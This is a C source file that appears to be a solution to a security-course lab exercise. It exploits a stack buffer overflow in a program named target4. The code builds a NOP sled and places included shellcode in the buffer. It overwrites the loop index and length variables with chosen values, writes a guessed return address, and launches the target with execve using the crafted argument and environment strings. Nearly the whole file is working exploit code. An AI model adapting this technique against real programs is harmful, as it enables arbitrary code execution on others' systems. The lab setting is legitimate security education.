#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define rip 0x3021fea8
#define len 0x3021fe9c
#define i_add 0x3021fe98
#define buf 0x3021fdf0
#define a 0x602090
#define b 0x602098
#define SHELLSIZE 45
#define BUFSIZE 189 //buf and rip difference 184 + 4 return address +1 null terminator
#define SIZE_BF_LEN 168

int main(void)
{
    char *    args[3];
    char *    env[6];

    //addresses
    char target_ra[] = "\xf0\xfd\x21\x30";//little-endian 0x3021fdf0
    char new_i[] = "\x96\x00\x00\x00";//0x00000096 150, i decreases to 150
    char new_len[] = "\xa9\x00\x00\x00";//0x000000a9 169 len maintain at 169

    //making overflow buffer
    char buff[BUFSIZE];

    //fill in the beginning with NOP

	//0
    for(int i=0;i<BUFSIZE; i++)
    {
        buff[i] = '\x90'; //fill with NOP=0x90
    }

    //put shellcode after

	//123
    for(int i=0;i<SHELLSIZE; i++)
    {
        buff[SIZE_BF_LEN-SHELLSIZE+i] = shellcode[i];
    }

	//168
    for(int i=0;i<4;i++)
    {
        buff[SIZE_BF_LEN+i] = new_i[i];
    }

	//172
    for(int i=0;i<4;i++)
    {
        buff[SIZE_BF_LEN+4+i] = new_len[i];
    }

    //fill 8 bit between len and rip with NOP
    for(int i=0;i<8;i++)
    {
        buff[SIZE_BF_LEN+4+4+i] = '\x90'; //fill with NOP=0x90
    }

    //put guessed return address before null terminator
    for(int i=0;i<4;i++)
    {
        buff[BUFSIZE-5+i] = target_ra[i];
    }

    //put null terminator at the end of buffer
    buff[BUFSIZE-1] = '\0';

    args[0] = TARGET;
    args[1] = buff;
    args[2] = NULL;
    env[0] = &buff[170]; //skip null in i
    env[1] = &buff[171]; //skip null in i
    env[2] = &buff[172]; //skip null in i*/
    env[3] = &buff[174]; //skip null in len
    env[4] = &buff[175]; //skip null in len
    env[5] = &buff[176]; //skip null in len*/




    if (0 > execve(TARGET, args, env))
      fprintf(stderr, "execve failed.\n");

    return 0;
}
